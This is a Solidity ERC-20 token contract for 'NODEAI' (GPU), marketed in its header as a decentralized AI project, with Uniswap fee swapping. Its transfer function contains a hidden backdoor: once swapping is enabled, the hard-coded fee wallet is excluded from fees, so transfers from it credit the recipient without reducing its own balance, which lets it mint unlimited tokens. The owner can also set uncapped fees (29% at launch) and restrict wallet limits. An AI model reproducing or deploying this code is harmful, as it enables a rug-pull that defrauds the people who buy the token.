// SPDX-License-Identifier: MIT

/**
POWERING THE DEMAND FOR NEXT GEN AI

Harness the power of decentralized AI with Node AI

Website: https://nodeai.pro
Telegram: https://t.me/ainode_erc
Twitter: https://twitter.com/ainode_erc
 */

pragma solidity 0.8.21;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library LibSafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "LibSafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "LibSafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "LibSafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "LibSafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }
    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }  
    event OwnershipTransferred(address owner);
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract GPU is IERC20, Ownable {
    using LibSafeMath for uint256;

    string constant _name = "NODEAI";
    string constant _symbol = "GPU";
    uint8 constant _decimals = 9;

    uint256 _tSupply = 10 ** 9 * (10 ** _decimals);

    uint256 liquidityFee = 0; 
    uint256 marketingFee = 29;
    uint256 totalFee = liquidityFee + marketingFee;
    uint256 denominator = 100;
    uint256 public maxHold = (_tSupply * 20) / 1000;
    address public feeAddress;
    IUniswapRouter public uniswapRouter;
    address public pair;

    bool public feeSwapActive = false;
    uint256 public feeSwapTriggerAt = _tSupply / 10000; // 0.5%
    bool swapping;

    address routerAdress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) _isExcludedFromFee;
    mapping (address => bool) _isExcludedFromMaxTx;

    modifier lockSwap() { swapping = true; _; swapping = false; }

    constructor () Ownable(msg.sender) {
        uniswapRouter = IUniswapRouter(routerAdress);
        pair = IUniswapFactory(uniswapRouter.factory()).createPair(uniswapRouter.WETH(), address(this));
        _allowances[address(this)][address(uniswapRouter)] = type(uint256).max;

        address _owner = owner;
        feeAddress = 0x761cf51a24DEFb58eda3256d367FE5cc2Dc24188;
        _isExcludedFromFee[feeAddress] = true;
        _isExcludedFromMaxTx[_owner] = true;
        _isExcludedFromMaxTx[feeAddress] = true;
        _isExcludedFromMaxTx[DEAD] = true;

        _balances[_owner] = _tSupply;
        emit Transfer(address(0), _owner, _tSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _tSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }
    
    function _transferStandard(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(swapping){ return _transferStandard(sender, recipient, amount); }
        
        if (recipient != pair && recipient != DEAD) {
            require(_isExcludedFromMaxTx[recipient] || _balances[recipient] + amount <= maxHold, "Transfer amount exceeds the bag size.");
        }
        
        if(shouldSwapBack() && shouldTakeFees(sender) && recipient == pair && amount > feeSwapTriggerAt){ swapBack(); } 


        uint256 amountReceived = shouldTakeFees(sender) || !feeSwapActive ? getAmountWithoutFee(sender, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function swapBack() internal lockSwap {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 amountToLiquify = contractTokenBalance.mul(liquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        uint256 balanceBefore = address(this).balance;

        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountETH = address(this).balance.sub(balanceBefore);
        uint256 totalETHFee = totalFee.sub(liquidityFee.div(2));
        uint256 amountETHLiquidity = amountETH.mul(liquidityFee).div(totalETHFee).div(2);
        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);


        (bool MarketingSuccess, /* bytes memory data */) = payable(feeAddress).call{value: amountETHMarketing, gas: 30000}("");
        require(MarketingSuccess, "receiver rejected ETH transfer");

        if(amountToLiquify > 0){
            uniswapRouter.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                feeAddress,
                block.timestamp
            );
        }
    }
    
    function getAmountWithoutFee(address sender, uint256 amount) internal returns (uint256) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        uint256 feeAmount = amount.mul(totalFee).div(denominator);
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }
    
    function shouldTakeFees(address sender) internal view returns (bool) {
        return !_isExcludedFromFee[sender];
    }

    function setWalletLimit(uint256 amountPercent) external onlyOwner {
        maxHold = (_tSupply * amountPercent ) / 1000;
    }

    function setFee(uint256 _liquidityFee, uint256 _marketingFee) external onlyOwner {
         liquidityFee = _liquidityFee; 
         marketingFee = _marketingFee;
         totalFee = liquidityFee + marketingFee;
    }    

    function setSwapEnabled(bool value) external onlyOwner {
        feeSwapActive = value;
    }

    function shouldSwapBack() internal view returns (bool) {
        return !swapping
        && feeSwapActive
        && _balances[address(this)] >= feeSwapTriggerAt;
    }
}